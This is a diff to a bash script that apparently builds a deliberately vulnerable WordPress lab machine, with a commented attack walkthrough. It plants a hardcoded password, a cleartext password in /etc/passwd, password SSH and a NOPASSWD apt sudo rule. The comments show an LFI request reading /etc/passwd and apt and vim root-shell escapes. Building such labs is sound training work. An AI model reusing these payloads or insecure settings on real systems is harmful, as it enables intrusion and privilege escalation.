@@ -5,6 +5,17 @@ if [[ $(/usr/bin/id -u) -ne 0 ]]; then
     exit
 fi
 
+while true; do
+    read -p "Did you run 'sudo apt upgrade' and restart the instance? " yn
+    case $yn in
+        [Yy]* ) make install; break;;
+        [Nn]* ) exit;;
+        * ) echo "Please answer yes or no.";;
+    esac
+done
+
+printf "\n\033[33;1mRun sudo apt upgrade and restart the machine before runnning this script\033[0m\n"
+
 read -p 'enter ec2 instance DNS name: ' dnsname
 password="w0rdpr355I54ann0y1NG"
 
@@ -87,7 +98,7 @@ moreWordpress(){
 
 userStuff(){
 	sudo useradd -s /bin/bash -p $(perl -e'print crypt("w0rdpr355I54ann0y1NG", "aa")') -m -N steve
-	sudo echo "steve ALL=(root) NOPASSWD: /usr/bin/vim" >> /etc/sudoers
+	sudo echo "steve ALL=(root) NOPASSWD: /usr/bin/apt" >> /etc/sudoers
 	sudo sed -i 's/1001:100:/1001:100:w0rdpr355I54ann0y1NG/' /etc/passwd
 	sudo sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
 	sudo systemctl reload sshd
@@ -121,10 +132,10 @@ userStuff
 
 # Walkthrough
 # nmap -sCV from internal IP finds 22/80
-# wpscan --url http://ec2-3-144-231-183.us-east-2.compute.amazonaws.com --plugins-detection aggressive
+# wpscan --url http:// site --plugins-detection aggressive
 # finds site-editor plugin
 # LFI on plugin /etc/passwd finds cleartext password
 # curl http:// site /wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
-# ssh
-# sudo -l finds vim usage
-# sudo vim -c ':!/bin/sh'
+# ssh in as steve
+# sudo -l finds apt usage
+# sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
